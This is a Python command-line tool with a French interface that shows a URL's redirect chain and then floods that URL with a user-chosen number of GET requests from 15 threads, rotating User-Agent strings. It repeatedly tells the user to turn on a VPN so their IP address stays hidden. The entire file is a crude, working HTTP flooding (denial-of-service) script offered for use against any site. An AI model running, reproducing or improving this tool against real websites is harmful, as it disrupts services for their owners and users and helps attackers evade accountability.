# -*- coding: utf-8 -*-

from os import name, system
from colorama import Fore, init
from requests import get
from threading import Thread
from random import randint


if name == 'nt':
    system("title At0mic")


def clear():
    system("cls") if name == 'nt' else system("clear")

def head():

    head_global = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
    
    head_1 = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"}
    head_2 = {"User-Agent": "AppleWebKit/537.11 (KHTML, like Gecko)"}
    head_3 = {"User-Agent": "Chrome/23.0.1271.64 Safari/537.11"}

    choix = randint(1, 4)

    if choix == 1:
        return head_global

    elif choix == 2:
        return head_1
    
    elif choix == 3:
        return head_2
    
    elif choix == 4:
        return head_3



clear()

number = 0
finish = False


init()

# mettre partout appuyer sur entrée pour quitter au lieu de sleep


def spam(url, total):
    global number
    global finish

    while True:
        if number >= total:
            finish = True
            return


        try:
            status = get(url, headers=head()).status_code
            if status == 429:
                finish == 'error'
                return
            number += 1
        except:
            finish == 'error'
            return




print(Fore.GREEN + """
                                             ▄▄▄· ▄▄▄▄▄      • ▌ ▄ ·. ▪   ▄▄· 
                                            ▐█ ▀█ •██  ▪     ·██ ▐███▪██ ▐█ ▌▪
                                            ▄█▀▀█  ▐█.▪ ▄█▀▄ ▐█ ▌▐▌▐█·▐█·██ ▄▄
                                            ▐█ ▪▐▌ ▐█▌·▐█▌.▐▌██ ██▌▐█▌▐█▌▐███▌
                                             ▀  ▀  ▀▀▀  ▀█▄▀▪▀▀  █▪▀▀▀▀▀▀·▀▀▀ """)
print(Fore.YELLOW + """
                                                    par billythegoat356\n\n\n""")



url = input(Fore.BLUE + "Entrez l'url > " + Fore.RESET)

input(Fore.RED + "\n[!] Attention. Veuillez activer un VPN sinon votre adresse IP sera dévoilée.")

try:
    content = get(url, headers=head())
except:
    print(Fore.RED + "\n[!] Erreur lors de la requête. L'url est probablement invalide.")
    input(Fore.RED + "\nAppuyez sur entrée pour quitter...")
    exit()

history = content.history

print("\n")

for i in range(len(history)):
    print(Fore.GREEN + str(i) + Fore.RESET, ">", Fore.YELLOW + str(history[i].url))

print(Fore.MAGENTA + "\nVoici les redirections de l'URL.")

requetes = input(Fore.BLUE + "\nVoulez vous spammer l'URL de requêtes? [y/n] " + Fore.RESET)

if requetes != "y":
    print(Fore.MAGENTA + "\nOke, a bientôt!")
    input(Fore.RED + "\nAppuyez sur entrée pour quitter...")
    exit()

input(Fore.RED + "\n[!] Attention. Veuillez garder le VPN activé sinon votre adresse IP sera dévoilée.")

total = input(Fore.BLUE + "\nCombien de requêtes voulez-vous faire? " + Fore.RESET)

try:
    total = int(total)
except:
    print(Fore.RED + "Merci de spécifier un nombre.")
    input(Fore.RED + "\nAppuyez sur entrée pour quitter...")
    exit()


for _ in range(15):
    Thread(target=spam, args=(url, total)).start()

print(Fore.YELLOW + "\nChargement en cours...")

while True:
    if finish == 'error':
        input(Fore.RED + "\n[!] Erreur. Vous êtes limité en requêtes, le lien est invalide ou le serveur à une erreur interne.")
        input(Fore.MAGENTA + f"\nRequêtes faites avec succés: {str(number)}.")
        exit()

    elif finish == True:
        input(Fore.YELLOW + f"\nLes {Fore.GREEN + str(total) + Fore.YELLOW} requêtes ont été faites avec succés!")
        input(Fore.MAGENTA + "\nAppuyez sur entrée pour quitter...")
        exit()